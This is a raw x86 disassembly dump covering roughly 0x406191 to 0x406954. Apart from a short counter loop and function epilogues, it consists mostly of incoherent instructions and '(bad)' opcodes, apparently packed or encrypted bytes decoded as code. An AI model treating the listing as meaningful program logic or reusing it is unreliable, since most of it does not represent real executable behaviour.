  406191:	cmp    edx,DWORD PTR [ebx-0x1c]
  406194:	xor    BYTE PTR [ecx-0x2252037d],0x71
  40619b:	sub    dh,al
  40619d:	int    0x9d
  40619f:	xchg   esp,eax
  4061a0:	repnz and eax,0x6f07cd22
  4061a6:	out    0x4f,al
  4061a8:	sbb    ebx,DWORD PTR [eax+0x67b981ae]
  4061ae:	rcl    BYTE PTR [ebx],1
  4061b0:	xor    DWORD PTR [ecx-0xe3d5217],0xffffff86
  4061b7:	jnp    0x406141
  4061b9:	test   BYTE PTR [ecx],bl
  4061bb:	div    BYTE PTR [edx+0x32]
  4061be:	add    BYTE PTR [ebx-0x39ccf3bb],cl
  4061c4:	add    eax,edi
  4061c6:	pop    edi
  4061c7:	pop    esi
  4061c8:	pop    ebx
  4061c9:	leave  
  4061ca:	ret    0x8
  4061cd:	xor    eax,eax
  4061cf:	ret    
  4061d0:	push   ebp
  4061d1:	mov    ebp,esp
  4061d3:	sub    esp,0x38
  4061d6:	and    DWORD PTR ds:0x428ec7,0x0
  4061e0:	xor    eax,eax
  4061e2:	xor    eax,DWORD PTR ds:0x428ec7
  4061e8:	inc    eax
  4061e9:	mov    ds:0x428ec7,eax
  4061ee:	cmp    DWORD PTR ds:0x428ec7,0x24
  4061f5:	jg     0x406216
  4061fb:	jmp    0x406209
  406200:	push   DWORD PTR [ebp-0x18]
  406203:	call   DWORD PTR ds:0x42a9eb
  406209:	cmp    DWORD PTR ds:0x428ec7,0x19
  406210:	jb     0x4061e0
  406216:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  40621d:	push   ebx
  40621e:	mov    eax,ds:0x428e23
  406223:	adc    DWORD PTR ds:0x428e9f,eax
  406229:	jmp    0x4085d8
  40622e:	xchg   ebp,eax
  40622f:	(bad)
  406232:	xchg   edx,eax
  406233:	add    al,0x95
  406235:	(bad)
  406239:	stos   DWORD PTR es:[edi],eax
  40623a:	xor    al,0xfe
  40623c:	call   0x837d6e2d
  406241:	xor    ecx,0x60
  406244:	add    DWORD PTR [ebx+0x35a2e286],0xffffffad
  40624b:	mov    dh,0x87
  40624d:	or     eax,0xd4417814
  406252:	adc    DWORD PTR [edx-0x44],0x70
  406256:	dec    edx
  406257:	sub    eax,0xe8a220bb
  40625c:	nop
  40625d:	sbb    eax,0x42ae20f9
  406262:	fucomip st,st(5)
  406264:	adc    dh,dl
  406266:	cld    
  406267:	sbb    BYTE PTR [ebp-0x40],ch
  40626a:	leave  
  40626b:	pop    ebp
  40626c:	and    BYTE PTR ds:0xc700926c,0x8b
  406273:	xchg   esp,eax
  406274:	clc    
  406275:	enter  0x7dff,0xff
  406279:	pop    ebx
  40627a:	test   ecx,esi
  40627c:	fsubr  st(4),st
  40627e:	adc    bh,0x53
  406281:	jne    0x4062e7
  406283:	sbb    DWORD PTR [ebp+0x711aeb5],0xb51124f1
  40628d:	aad    0xc
  40628f:	add    bl,al
  406291:	xchg   dh,bh
  406293:	jae    0x4062ac
  406295:	pop    edx
  406296:	popf   
  406297:	pop    edx
  406298:	pop    ebx
  406299:	add    BYTE PTR [eax-0x38ec1684],bh
  40629f:	sahf   
  4062a0:	cli    
  4062a1:	cmp    DWORD PTR [ecx-0xc6ea145],edx
  4062a7:	inc    esp
  4062a8:	mov    cl,0x34
  4062aa:	mov    ecx,0xf5c0b62
  4062af:	stos   DWORD PTR es:[edi],eax
  4062b0:	or     al,0x5e
  4062b2:	je     0x40629f
  4062b4:	sub    ecx,edi
  4062b6:	push   ecx
  4062b7:	aad    0xd3
  4062b9:	jmp    0x6716138d
  4062be:	rol    WORD PTR [edi-0x1b],cl
  4062c2:	retf   
  4062c3:	in     al,0x89
  4062c5:	adc    DWORD PTR [esi],edi
  4062c7:	jne    0x4062f1
  4062c9:	xchg   DWORD PTR [edx-0x51a41d6b],edi
  4062cf:	dec    esi
  4062d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062d1:	sub    bl,0x23
  4062d4:	mov    dl,0x61
  4062d6:	call   FWORD PTR cs:[eiz*2-0x5b18f925]
  4062de:	ja     0x406297
  4062e0:	xchg   ebx,eax
  4062e1:	add    al,0x2
  4062e3:	daa    
  4062e4:	sub    eax,0x1d991f3d
  4062e9:	fcom   QWORD PTR [esp+esi*2+0x41]
  4062ed:	std    
  4062ee:	std    
  4062ef:	loopne 0x406308
  4062f1:	scas   al,BYTE PTR es:[edi]
  4062f2:	adc    al,0xc
  4062f4:	push   edi
  4062f5:	inc    eax
  4062f6:	(bad)  
  4062f7:	sbb    edi,DWORD PTR [ebp-0x61]
  4062fa:	dec    esp
  4062fb:	data16 test al,0x17
  4062fe:	outs   dx,BYTE PTR ds:[esi]
  4062ff:	push   edi
  406301:	jno    0x4062dc
  406303:	push   ds
  406304:	scas   eax,DWORD PTR es:[edi]
  406305:	adc    ecx,DWORD PTR [esi-0x67e00d22]
  40630b:	jge    0x4062bd
  40630d:	dec    edx
  40630e:	test   eax,0x3648a1ed
  406313:	cmp    bh,0x39
  406316:	scas   eax,DWORD PTR es:[edi]
  406317:	dec    ecx
  406318:	adc    edx,DWORD PTR [ebx+0x2a229db5]
  40631e:	xlat   BYTE PTR ds:[ebx]
  40631f:	scas   eax,DWORD PTR es:[edi]
  406320:	enter  0x17ae,0x47
  406324:	and    BYTE PTR gs:[ebx],ah
  406327:	ret    
  406328:	fmul   st(1),st
  40632a:	xor    eax,0x860723ec
  40632f:	fs and eax,0xdb3b5ddb
  406335:	in     eax,dx
  406336:	sub    BYTE PTR [edx],bl
  406338:	int    0x39
  40633a:	pop    esp
  40633b:	jne    0x4062e3
  40633d:	arpl   WORD PTR [eax],bp
  40633f:	xchg   ebp,eax
  406340:	push   eax
  406341:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406342:	rcr    BYTE PTR ds:[esi+0x77],1
  406346:	dec    edx
  406347:	sbb    DWORD PTR [ebx-0x2d8b566c],0x7f
  40634e:	clc    
  40634f:	sbb    ebx,ecx
  406351:	aam    0x5c
  406353:	pop    ds
  406354:	pop    edx
  406355:	(bad)  
  406356:	iret   
  406357:	mov    dh,0x2a
  406359:	mov    ch,0x2e
  40635b:	dec    cx
  40635d:	xchg   edx,eax
  40635e:	ret    
  40635f:	iret   
  406360:	mov    eax,0x1e401f11
  406365:	cmp    BYTE PTR [ebp-0x619fc3ba],cl
  40636b:	sti    
  40636c:	repz daa 
  40636e:	dec    ebx
  40636f:	mov    ebx,DWORD PTR [ebx]
  406371:	(bad)  
  406372:	xor    eax,0x6f7eb62c
  406377:	jno    0x406367
  406379:	fs push ebx
  40637b:	jp     0x4063f9
  40637d:	ins    BYTE PTR es:[edi],dx
  40637e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40637f:	pop    ecx
  406380:	add    BYTE PTR [ebp+0x3a],0xc
  406384:	lds    eax,FWORD PTR [esi+0x368f45fb]
  40638a:	pop    ebp
  40638b:	loope  0x4063b3
  40638d:	or     ah,al
  40638f:	mov    esi,0xd1c86a86
  406394:	push   cs
  406395:	sub    eax,0xf6ad419
  40639a:	std    
  40639b:	ds push ds
  40639d:	jmp    0x40640c
  40639f:	push   esi
  4063a0:	daa    
  4063a1:	inc    esi
  4063a2:	sub    al,0x3e
  4063a4:	cmp    DWORD PTR [ebp+0xb475d6],esp
  4063aa:	sub    BYTE PTR [ebp-0x8],dh
  4063ad:	mov    ebx,0x11bbbc5
  4063b2:	lods   eax,DWORD PTR ds:[esi]
  4063b3:	cmp    BYTE PTR [edi+ecx*8],bl
  4063b6:	push   0x7e2343d0
  4063bb:	popf   
  4063bc:	enter  0x35c7,0xc8
  4063c0:	mov    bl,0xa5
  4063c2:	lods   eax,DWORD PTR ds:[esi]
  4063c3:	pop    esp
  4063c4:	das    
  4063c5:	jmp    0x3ea4:0xa008a7ce
  4063cc:	inc    ecx
  4063cd:	add    edi,DWORD PTR [ebx-0x6d7a0393]
  4063d3:	jge    0x406355
  4063d5:	outs   dx,DWORD PTR ds:[esi]
  4063d6:	mov    dh,0xa4
  4063d8:	inc    edi
  4063d9:	sbb    DWORD PTR cs:[ebx],0xcac81564
  4063e0:	scas   al,BYTE PTR es:[edi]
  4063e1:	sub    esi,DWORD PTR [edx+0x79]
  4063e4:	push   edi
  4063e5:	lock cmp DWORD PTR [ebp+0x50c48f4f],0xa42e2314
  4063f0:	pop    ds
  4063f1:	dec    ebp
  4063f2:	ins    DWORD PTR es:[edi],dx
  4063f3:	pop    ds
  4063f4:	pop    esp
  4063f5:	out    0x27,al
  4063f7:	shl    DWORD PTR [ecx-0x15],1
  4063fa:	std    
  4063fb:	ja     0x406441
  4063fd:	cld    
  4063fe:	fld    QWORD PTR [ebp+edi*2+0x7c]
  406402:	cs (bad) 
  406404:	lods   al,BYTE PTR ds:[esi]
  406405:	add    eax,esi
  406407:	fist   WORD PTR [eax+edx*8-0x772d43b2]
  40640e:	or     DWORD PTR [ecx],ecx
  406410:	pop    ss
  406411:	inc    esp
  406412:	stos   DWORD PTR es:[edi],eax
  406413:	xor    esi,DWORD PTR fs:[ebx]
  406416:	push   edi
  406417:	fwait
  406418:	js     0x4063fb
  40641a:	sbb    al,0x41
  40641c:	lods   eax,DWORD PTR ds:[esi]
  40641d:	push   0x399bc609
  406422:	js     0x40644b
  406424:	mov    eax,ds:0x8a62cffa
  406429:	xor    esi,ecx
  40642b:	xchg   edx,eax
  40642c:	adc    BYTE PTR [ebp+0x1c],dh
  40642f:	enter  0x56a4,0x48
  406433:	mov    eax,0x30e265d9
  406438:	repnz outs dx,BYTE PTR ds:[esi]
  40643a:	sub    esi,esp
  40643c:	cmp    DWORD PTR [eax],ecx
  40643e:	(bad)  
  40643f:	out    0xdf,eax
  406441:	js     0x40644a
  406443:	xchg   edx,eax
  406444:	dec    ebp
  406445:	lock adc esp,ebp
  406448:	adc    bh,cl
  40644a:	push   esi
  40644b:	in     eax,0xb1
  40644d:	and    BYTE PTR [ebx],dl
  40644f:	inc    ebx
  406450:	jbe    0x406420
  406452:	cli    
  406453:	inc    edx
  406454:	xor    BYTE PTR [ebx],cl
  406456:	xor    edi,eax
  406458:	outs   dx,DWORD PTR ds:[esi]
  406459:	pop    ds
  40645a:	push   ebp
  40645b:	into   
  40645c:	mov    DWORD PTR [ebx-0x39],esp
  40645f:	sbb    DWORD PTR [ebx],esi
  406461:	hlt    
  406462:	pop    ss
  406463:	cs pushf 
  406465:	icebp  
  406466:	fst    QWORD PTR [ecx]
  406468:	sub    ecx,DWORD PTR [ebx+0x7c]
  40646b:	jmp    0x958d:0x3f1f49e2
  406472:	sti    
  406473:	push   0xffffff88
  406475:	sbb    DWORD PTR [edi+edi*1+0x302b1cbd],0xc3dd185e
  406480:	leave  
  406481:	jg     0x40644f
  406483:	fucomi st,st(2)
  406485:	shr    dh,0x1d
  406488:	sbb    DWORD PTR [ecx+0x20],ecx
  40648b:	movsx  esp,dl
  40648e:	mov    bh,0x85
  406490:	pop    eax
  406491:	xchg   ebx,eax
  406492:	in     eax,dx
  406493:	hlt    
  406494:	fidiv  WORD PTR [esi+0x33]
  406497:	jp     0x406444
  406499:	xor    al,0xbe
  40649b:	jmp    0xde57:0x94081191
  4064a2:	out    0x1a,al
  4064a4:	mov    ch,0xe2
  4064a6:	fidiv  DWORD PTR ds:0xde92961
  4064ac:	mov    ah,BYTE PTR [esi+edx*4+0x35]
  4064b0:	dec    edx
  4064b1:	pop    ebx
  4064b2:	hlt    
  4064b3:	clc    
  4064b4:	push   ss
  4064b5:	(bad)  
  4064b6:	pop    ecx
  4064b7:	clc    
  4064b8:	or     BYTE PTR [ebx],al
  4064ba:	mov    edi,0x30a148a3
  4064bf:	xor    al,0x2d
  4064c1:	xchg   ebx,eax
  4064c2:	clc    
  4064c3:	sbb    BYTE PTR [ecx+0x21],0x51
  4064c7:	(bad)  
  4064c8:	xor    al,0x65
  4064ca:	mov    ch,0x6e
  4064cc:	les    esp,FWORD PTR [ecx-0x4b149745]
  4064d2:	adc    DWORD PTR [edx+0x15cfe430],edi
  4064d8:	mov    cl,0xf2
  4064da:	stos   BYTE PTR es:[edi],al
  4064db:	pop    ecx
  4064dc:	iret   
  4064dd:	push   ecx
  4064de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064df:	push   ebp
  4064e0:	cmp    BYTE PTR [edi],ch
  4064e2:	jbe    0x406473
  4064e4:	sbb    eax,0xd11c401d
  4064e9:	jecxz  0x406543
  4064eb:	std    
  4064ec:	push   cs
  4064ed:	ss sbb eax,0xfefccae6
  4064f3:	adc    al,0xfd
  4064f5:	fisub  DWORD PTR [ebx+0x15]
  4064f8:	fst    QWORD PTR [esi-0x34993146]
  4064fe:	mov    DWORD PTR [edi],eax
  406500:	mov    WORD PTR [edi-0x7684f6ad],?
  406506:	xchg   BYTE PTR [eax-0x1e],bl
  406509:	sub    BYTE PTR [edx+0x5094a1ee],bh
  40650f:	repz push 0x2c611285
  406515:	pop    ss
  406516:	jmp    0x903394b9
  40651b:	fs aam 0x91
  40651e:	ficom  DWORD PTR [ebx-0x51a7933d]
  406524:	push   ebp
  406525:	rol    BYTE PTR [ecx+esi*4+0x24],0xa
  40652a:	add    dh,bl
  40652c:	inc    eax
  40652d:	push   0xb83ba10c
  406532:	jecxz  0x40654e
  406534:	pop    ebp
  406535:	xchg   ebx,eax
  406536:	icebp  
  406537:	jecxz  0x40651c
  406539:	add    DWORD PTR [eax+0x6e],ebx
  40653c:	cdq    
  40653d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40653e:	test   BYTE PTR [ebp-0x3a],0xda
  406542:	pop    esi
  406543:	inc    ecx
  406544:	jecxz  0x40653f
  406546:	add    BYTE PTR [edx],0xb0
  406549:	in     eax,0xd5
  40654b:	rol    DWORD PTR [edi+0x7db20693],1
  406551:	ret    
  406552:	mov    al,ds:0x30fedf75
  406557:	test   DWORD PTR [eax+0x40202b3d],ebp
  40655d:	out    dx,eax
  40655e:	pusha  
  40655f:	mov    cl,0x89
  406561:	ss je  0x4064f0
  406564:	jns    0x4065b9
  406566:	test   eax,0x19350dc6
  40656b:	sub    al,0xce
  40656d:	bswap  eax
  40656f:	stos   BYTE PTR es:[edi],al
  406570:	imul   esi,DWORD PTR [esp+edx*1+0x5b872aeb],0x71
  406578:	pop    edx
  406579:	bound  eax,QWORD PTR [ecx]
  40657b:	sub    bl,bl
  40657d:	pop    ebx
  40657e:	int3   
  40657f:	dec    ecx
  406580:	retf   0xd148
  406583:	sar    DWORD PTR [ecx-0xc2a6fce],1
  406589:	mov    dh,0x33
  40658b:	lahf   
  40658c:	stc    
  40658d:	jae    0x4065de
  40658f:	xchg   BYTE PTR [ecx-0x4c],dl
  406592:	inc    ebp
  406593:	mov    es,WORD PTR [edx]
  406595:	pop    ss
  406596:	xchg   DWORD PTR [ecx-0x7],ebx
  406599:	fs aaa 
  40659b:	loopne 0x4065b9
  40659d:	inc    eax
  40659e:	test   al,0x3
  4065a0:	ficom  DWORD PTR [edi-0x3f]
  4065a3:	stos   DWORD PTR es:[edi],eax
  4065a4:	stos   BYTE PTR es:[edi],al
  4065a5:	nop
  4065a6:	xor    BYTE PTR [edi-0x71],ah
  4065a9:	retf   0x2ae4
  4065ac:	pop    ebp
  4065ad:	sbb    esp,edi
  4065af:	or     dl,BYTE PTR [edx-0xf9155f6]
  4065b5:	fidiv  WORD PTR [ecx]
  4065b7:	lahf   
  4065b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065b9:	cld    
  4065ba:	fwait
  4065bb:	jmp    0x406545
  4065bd:	mov    cl,0xf8
  4065bf:	sbb    al,0xea
  4065c1:	(bad)  
  4065c2:	lods   eax,DWORD PTR ds:[esi]
  4065c3:	jne    0x406605
  4065c5:	add    ah,ch
  4065c7:	repz idiv DWORD PTR [ebx]
  4065ca:	lods   eax,DWORD PTR ds:[esi]
  4065cb:	pop    ecx
  4065cc:	dec    esp
  4065cd:	add    dl,al
  4065cf:	cmp    eax,0x6590a3a9
  4065d4:	add    BYTE PTR [eax+0xc],bh
  4065d7:	lock fisub WORD PTR [edx-0x78ea3863]
  4065de:	sbb    edi,DWORD PTR [ecx+eax*1-0x39ac11ee]
  4065e5:	aam    0x94
  4065e7:	jnp    0x406625
  4065e9:	inc    esp
  4065ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065eb:	add    esi,esi
  4065ed:	and    eax,0xe7250542
  4065f2:	jno    0x406663
  4065f4:	ins    DWORD PTR es:[edi],dx
  4065f5:	ja     0x4065ab
  4065f7:	stos   DWORD PTR es:[edi],eax
  4065f8:	in     eax,0x32
  4065fa:	adc    edi,DWORD PTR [esi-0x7f]
  4065fd:	add    ebp,eax
  4065ff:	cmovge ebx,DWORD PTR [ebx+0x60]
  406603:	out    dx,al
  406604:	add    DWORD PTR [esi+0xc745b7d],esi
  40660a:	jb     0x4065bb
  40660c:	mov    ds:0x981428a2,eax
  406611:	cwde   
  406612:	pop    esi
  406613:	stos   BYTE PTR es:[edi],al
  406614:	out    0x31,eax
  406616:	jno    0x406650
  406618:	cmp    ah,ch
  40661a:	fcmovb st,st(1)
  40661c:	clc    
  40661d:	(bad)  
  40661e:	xlat   BYTE PTR ds:[ebx]
  40661f:	lea    esi,[edx+0x1d60df9f]
  406625:	pop    edx
  406626:	jge    0x406673
  406628:	(bad)  
  406629:	popf   
  40662a:	dec    esi
  40662b:	popa   
  40662c:	xchg   ebp,eax
  40662d:	fs jns 0x40666c
  406630:	push   cs
  406631:	test   eax,eax
  406633:	sbb    DWORD PTR [ebp+0x12],0x9250d68e
  40663a:	stc    
  40663b:	pop    esp
  40663c:	fucom  st(0)
  40663e:	pop    esi
  40663f:	xor    DWORD PTR [eax-0x24fe9c12],edx
  406645:	cld    
  406646:	inc    ebx
  406647:	into   
  406648:	loopne 0x406669
  40664a:	xor    al,0xad
  40664c:	ret    
  40664d:	push   ds
  40664e:	bound  esp,QWORD PTR [ebx]
  406650:	mov    edx,DWORD PTR [esi]
  406652:	fistp  WORD PTR [ecx]
  406654:	into   
  406655:	out    0xb5,eax
  406657:	pop    esi
  406658:	mov    ds:0xb6c8fd29,al
  40665d:	mov    al,ds:0xef36b8
  406662:	fs jg  0x4066b0
  406665:	jne    0x40668e
  406667:	and    BYTE PTR [esi-0x371e1b79],ch
  40666d:	fdivr  QWORD PTR ds:0x46c3f1aa
  406673:	sub    al,BYTE PTR [esi+edi*2]
  406676:	in     eax,dx
  406677:	xchg   DWORD PTR [ebx+0x1b],edi
  40667a:	push   ebp
  40667b:	xlat   BYTE PTR ds:[ebx]
  40667c:	daa    
  40667d:	ja     0x40663d
  40667f:	adc    ch,BYTE PTR [ebp-0x66e5a1bf]
  406685:	pop    eax
  406686:	sbb    bh,BYTE PTR [eax]
  406688:	and    BYTE PTR [ecx+0x35fb3307],bl
  40668e:	mov    ebx,ss
  406690:	xor    DWORD PTR [eax],0x2e475208
  406696:	and    bh,BYTE PTR [ecx]
  406698:	jge    0x40661f
  40669a:	cmp    ah,cl
  40669c:	pop    esp
  40669d:	gs jb  0x406715
  4066a0:	push   0x9c2e641c
  4066a5:	jle    0x40664d
  4066a7:	sub    eax,DWORD PTR [eax]
  4066a9:	xor    al,0x7c
  4066ab:	adc    BYTE PTR [edx+0x6a],0x98
  4066af:	xchg   ebx,eax
  4066b0:	jne    0x40666d
  4066b2:	inc    esp
  4066b3:	outs   dx,DWORD PTR ds:[esi]
  4066b4:	je     0x406706
  4066b6:	clc    
  4066b7:	pushf  
  4066b8:	adc    BYTE PTR [edx+0x59],ch
  4066bb:	addr16 sub eax,esi
  4066be:	push   ss
  4066bf:	mov    eax,ds:0xb3bbc841
  4066c4:	dec    ebx
  4066c5:	xchg   ecx,eax
  4066c6:	or     dh,BYTE PTR [eax]
  4066c8:	in     eax,dx
  4066c9:	mov    eax,0x7ba31f4d
  4066ce:	inc    ecx
  4066cf:	inc    ebp
  4066d0:	popa   
  4066d1:	dec    ebx
  4066d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066d3:	mov    ecx,DWORD PTR [esi+esi*8]
  4066d6:	xchg   edi,eax
  4066d7:	lods   eax,DWORD PTR ds:[esi]
  4066d8:	test   eax,0xb12c2a56
  4066dd:	les    ebx,FWORD PTR [esi]
  4066df:	sub    al,0xf0
  4066e1:	pop    ds
  4066e2:	cmp    eax,0xab9a0997
  4066e7:	mov    dh,0xc5
  4066e9:	stos   BYTE PTR es:[edi],al
  4066ea:	and    DWORD PTR [ebx+0x353c8177],0xce807921
  4066f4:	add    al,al
  4066f6:	les    eax,FWORD PTR [ebp+0x73]
  4066f9:	mov    eax,0xacdeab16
  4066fe:	icebp  
  4066ff:	mov    fs,WORD PTR [edi*1+0x1721621d]
  406706:	mov    ds:0xbd5b794f,al
  40670b:	mov    eax,es
  40670d:	mov    ecx,0xc4ab69fa
  406712:	jp     0x4066c2
  406714:	mov    es,WORD PTR [eax-0x29a33858]
  40671a:	aam    0xeb
  40671c:	inc    ebx
  40671d:	cmc    
  40671e:	pop    ebp
  40671f:	(bad)  
  406720:	inc    eax
  406721:	shr    DWORD PTR [edi-0x4],cl
  406724:	xor    cl,dl
  406726:	test   al,0x2f
  406728:	inc    ecx
  406729:	adc    esp,0xffffffd3
  40672c:	or     al,0xfe
  40672e:	jmp    0x5335a69f
  406733:	fs gs pusha 
  406736:	push   ecx
  406737:	xchg   esi,eax
  406738:	mov    WORD PTR [ebp-0x4b],es
  40673b:	std    
  40673c:	fimul  WORD PTR [eax+0x44f226ab]
  406742:	mov    WORD PTR [ecx],ds
  406744:	ror    DWORD PTR [edx+0x55],cl
  406747:	pop    ebp
  406748:	mov    esi,edi
  40674a:	xchg   edx,eax
  40674b:	mov    WORD PTR [edi-0x2cf61a38],?
  406751:	mov    ebp,0xe4d61610
  406756:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406757:	mov    ch,0x5d
  406759:	hlt    
  40675a:	fisttp DWORD PTR [edi-0x4d686cbe]
  406760:	fs cld 
  406762:	inc    ebp
  406763:	retf   0x4016
  406766:	(bad)  
  406767:	push   ds
  406768:	xchg   ecx,eax
  406769:	das    
  40676a:	iret   
  40676b:	push   ds
  40676c:	mov    ebp,0xa770803f
  406771:	das    
  406772:	mov    eax,ds:0xf98d4c82
  406777:	pop    ebp
  406778:	adc    eax,0x9a7645d7
  40677d:	jbe    0x4067a3
  40677f:	ds cmp al,0x9f
  406782:	ret    0x67b3
  406785:	and    eax,ecx
  406787:	mov    ch,0xde
  406789:	out    dx,eax
  40678a:	rcpps  xmm1,xmm2
  40678d:	push   0xffffffed
  40678f:	dec    esi
  406790:	mov    ecx,0xf91134ec
  406795:	loopne 0x4067c6
  406797:	xor    al,0x47
  406799:	pop    esp
  40679a:	rcl    DWORD PTR [eax+0x19],0x77
  40679e:	push   esp
  40679f:	cmp    dl,ch
  4067a1:	mov    ds:0xdf0662c4,al
  4067a6:	cmp    al,0x61
  4067a8:	rcr    BYTE PTR [edx-0x5d],0x9b
  4067ac:	mov    dh,0xa5
  4067ae:	push   esp
  4067af:	dec    edi
  4067b0:	lahf   
  4067b1:	aad    0x6d
  4067b3:	int3   
  4067b4:	add    DWORD PTR [eax],edi
  4067b6:	push   esi
  4067b7:	arpl   WORD PTR [ecx+esi*8],sp
  4067ba:	jl     0x4067f2
  4067bc:	outs   dx,DWORD PTR ds:[esi]
  4067bd:	add    al,0x25
  4067bf:	lods   eax,DWORD PTR ds:[esi]
  4067c0:	aaa    
  4067c1:	js     0x4067c6
  4067c3:	fxam   
  4067c5:	dec    ebp
  4067c6:	mov    bh,cl
  4067c8:	pushf  
  4067c9:	nop
  4067ca:	not    DWORD PTR [ebp+0x114a4628]
  4067d0:	std    
  4067d1:	pop    ss
  4067d2:	mov    ch,0x18
  4067d4:	(bad)  
  4067d5:	adc    edx,eax
  4067d7:	inc    edx
  4067d8:	ds adc dh,0x68
  4067dc:	sahf   
  4067dd:	jge    0x4067e5
  4067df:	push   0xffffffdf
  4067e1:	mov    WORD PTR [ebx+ecx*8-0x2],ds
  4067e5:	jp     0x40676a
  4067e7:	jge    0x40683c
  4067e9:	pop    ebx
  4067ea:	out    dx,al
  4067eb:	jle    0x406779
  4067ed:	repnz shr BYTE PTR [eax+0x35],0xa6
  4067f2:	icebp  
  4067f3:	lock neg BYTE PTR [edx+0x1d88855]
  4067fa:	xor    al,0x32
  4067fc:	pop    es
  4067fd:	or     eax,DWORD PTR [esi+0x63]
  406800:	and    al,0xa6
  406802:	xchg   ecx,eax
  406803:	fadd   st(1),st
  406805:	push   es
  406806:	sbb    ebx,DWORD PTR [eax+0x7f]
  406809:	inc    ecx
  40680a:	adc    DWORD PTR [esi+0x6959d9b9],eax
  406810:	jmp    0x68c92e3c
  406815:	stos   DWORD PTR es:[edi],eax
  406816:	push   esp
  406817:	pop    ss
  406818:	ficom  WORD PTR [ebx-0x3d]
  40681b:	or     dh,BYTE PTR [edi+0x58]
  40681e:	or     BYTE PTR [ecx-0x54c69543],ah
  406824:	inc    esp
  406825:	shr    ebp,cl
  406827:	sub    al,0x9c
  406829:	fwait
  40682a:	add    BYTE PTR [edx+0x3920f416],bl
  406830:	cmc    
  406831:	and    eax,DWORD PTR [edx-0x43]
  406834:	aam    0xaf
  406836:	push   DWORD PTR [edi]
  406838:	(bad)  [ecx+0x3c]
  40683b:	adc    al,0xe8
  40683d:	mov    dl,0x4d
  40683f:	sbb    DWORD PTR [ecx+0x38],edx
  406842:	inc    eax
  406843:	outs   dx,BYTE PTR ds:[esi]
  406844:	jo     0x406891
  406846:	(bad)  
  406847:	out    0xc4,al
  406849:	lahf   
  40684a:	xor    al,0x22
  40684c:	mov    ah,0xbb
  40684e:	test   al,0x3d
  406850:	inc    esi
  406851:	jg     0x40689b
  406853:	in     al,0xdd
  406855:	jp     0x40685d
  406857:	and    BYTE PTR [eax-0x54],al
  40685a:	jae    0x4068bb
  40685c:	inc    edi
  40685d:	dec    ebp
  40685e:	pop    esp
  40685f:	popf   
  406860:	fidivr DWORD PTR [eax+0x320db136]
  406866:	(bad)  
  406867:	into   
  406868:	(bad)  
  40686a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40686b:	repnz bound esp,QWORD PTR [esp+esi*2+0x78f04387]
  406873:	or     al,0xe7
  406875:	enter  0x1d06,0xa
  406879:	sub    esi,ebp
  40687b:	adc    eax,0xb687d8e0
  406880:	out    0x1b,eax
  406882:	xchg   edx,eax
  406883:	into   
  406884:	xchg   ebx,eax
  406885:	mov    edx,0x1231a954
  40688a:	lds    edx,FWORD PTR [edi]
  40688c:	mov    edi,0x2c5fd657
  406891:	xor    dh,BYTE PTR [esi]
  406893:	add    ah,0xd
  406896:	ds jne 0x4068e3
  406899:	inc    BYTE PTR [edi+0x17388682]
  40689f:	cmp    al,0xe1
  4068a1:	scas   al,BYTE PTR es:[edi]
  4068a2:	push   edx
  4068a3:	(bad)  
  4068a4:	pop    ss
  4068a5:	(bad)  
  4068a6:	stc    
  4068a7:	pushf  
  4068a8:	xchg   DWORD PTR [ebp+0x7ea5aeca],edx
  4068ae:	jmp    0xf34b:0x9522233c
  4068b5:	in     eax,0x96
  4068b7:	(bad)  
  4068b8:	mov    ds:0x7bce5c97,al
  4068bd:	cmc    
  4068be:	(bad)  
  4068bf:	retf   0xb543
  4068c2:	push   esp
  4068c3:	push   ecx
  4068c4:	push   0xffffffb9
  4068c6:	int3   
  4068c7:	inc    esp
  4068c8:	nop
  4068c9:	dec    ebp
  4068ca:	hlt    
  4068cb:	out    0xeb,al
  4068cd:	(bad)  
  4068ce:	js     0x4068ef
  4068d0:	add    BYTE PTR [ebx+edx*2],al
  4068d3:	mov    ds:0x90e2f845,eax
  4068d8:	test   al,0xa0
  4068da:	mov    eax,DWORD PTR [ebx]
  4068dc:	dec    ebx
  4068dd:	sahf   
  4068de:	push   ebx
  4068df:	cmp    BYTE PTR [eax+0xc],ah
  4068e2:	mov    ds:0xc65c2e1b,al
  4068e7:	mov    esi,DWORD PTR [edx]
  4068e9:	hlt    
  4068ea:	in     eax,0x85
  4068ec:	add    al,0xb4
  4068ee:	jg     0x4068f6
  4068f0:	stos   BYTE PTR es:[edi],al
  4068f1:	mov    ebx,0xa2cd9988
  4068f6:	sahf   
  4068f7:	shl    DWORD PTR [edi],cl
  4068f9:	jnp    0x4068ba
  4068fb:	push   esi
  4068fc:	fmul   st(3),st
  4068fe:	jl     0x4068d9
  406900:	adc    al,0x8f
  406902:	imul   ecx,DWORD PTR [eax-0x743042db],0x873cd6f2
  40690c:	daa    
  40690d:	jo     0x40691e
  40690f:	adc    BYTE PTR [esi+0x33],bl
  406912:	xchg   esi,eax
  406913:	shl    DWORD PTR [ebp+0x8],0xe8
  406917:	cmp    ecx,ebp
  406919:	test   eax,0x18ea6fb1
  40691e:	mov    eax,ds:0x88f69f20
  406923:	daa    
  406924:	lods   eax,DWORD PTR ds:[esi]
  406925:	and    al,0xe9
  406927:	mov    ebx,0x364715b7
  40692c:	mov    ah,0xd
  40692e:	xor    eax,0x277811ed
  406933:	cmc    
  406934:	mov    bh,0x8c
  406936:	jns    0x40690d
  406938:	(bad)  
  406939:	xor    BYTE PTR [edx],bh
  40693b:	adc    eax,DWORD PTR [esi+0x5f79a12a]
  406941:	out    dx,eax
  406942:	scas   al,BYTE PTR es:[edi]
  406943:	push   edi
  406944:	std    
  406945:	mov    WORD PTR [ecx+0x3d],fs
  406948:	jns    0x4068d0
  40694a:	pusha  
  40694b:	dec    esp
  40694c:	in     eax,0x89
  40694e:	xor    eax,DWORD PTR [edx-0x40]
  406951:	push   DWORD PTR [ecx]
  406953:	stos   BYTE PTR es:[edi],al
  406954:	clc    
